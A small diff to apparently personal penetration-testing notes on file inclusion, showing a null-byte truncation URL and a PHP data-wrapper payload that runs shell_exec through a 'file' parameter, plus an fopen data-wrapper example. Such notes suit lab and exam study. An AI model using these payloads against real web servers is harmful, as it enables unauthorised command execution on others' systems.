@@ -22,6 +22,6 @@ http://www.bostonwebgroup.com/script.php?file=shell.php%00.dat
 
 ### PHP wrappers
 ```
-http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
-it will execute dir right away
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>(it will execute dir right away)
+$fp = fopen('data:text/plain;base64,'.base64_encode($data), 'rb'); // base64 encoded data
 ```
